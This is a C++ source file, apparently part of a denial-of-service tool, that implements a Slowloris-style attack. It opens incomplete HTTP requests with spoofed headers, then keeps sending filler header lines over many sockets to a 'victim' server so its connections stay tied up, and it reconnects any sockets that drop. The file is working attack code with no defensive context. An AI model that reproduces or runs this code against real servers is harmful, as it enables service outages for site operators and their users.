#include "attack.h"
#include <iostream>
#include <cstring>
#include <stdexcept>
#include <mutex>

std::mutex socketListMutex;

void initialSendSocket(int socketNum)
{
    char incompleteHeader[255];
    sprintf(incompleteHeader, "GET /%d HTTP/1.1\r\n", rand() % 99999);
    send(socketNum, incompleteHeader, strlen(incompleteHeader), 0);
    sprintf(incompleteHeader, "HOST: \r\n");
    send(socketNum, incompleteHeader, strlen(incompleteHeader), 0);
    sprintf(incompleteHeader, "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n");
    send(socketNum, incompleteHeader, strlen(incompleteHeader), 0);
    sprintf(incompleteHeader, "Content-Length: %d\r\n", (rand() % 99999 + 1000));
    send(socketNum, incompleteHeader, strlen(incompleteHeader), 0);
}

void spamPartialHeaders(struct sockaddr_in victim, std::vector<int>& socketList)
{
    std::lock_guard<std::mutex> lock(socketListMutex); // Ensure thread-safe access to socketList
    for (size_t i = 0; i < socketList.size(); i++)
    {
        try
        {
            char incompleteHeader[50];
            sprintf(incompleteHeader, "X-a: %d\r\n", (rand() % 99999));
            send(socketList[i], incompleteHeader, strlen(incompleteHeader), 0);
        }
        catch (const std::exception& ex)
        {
            std::cerr << "Exception caught: " << ex.what() << std::endl;
            close(socketList[i]);
            socketList[i] = socket(AF_INET, SOCK_STREAM, 0);
            if (socketList[i] != -1)
            {
                connect(socketList[i], (struct sockaddr*)&victim, sizeof(victim));
                initialSendSocket(socketList[i]);
            }
        }
    }
}
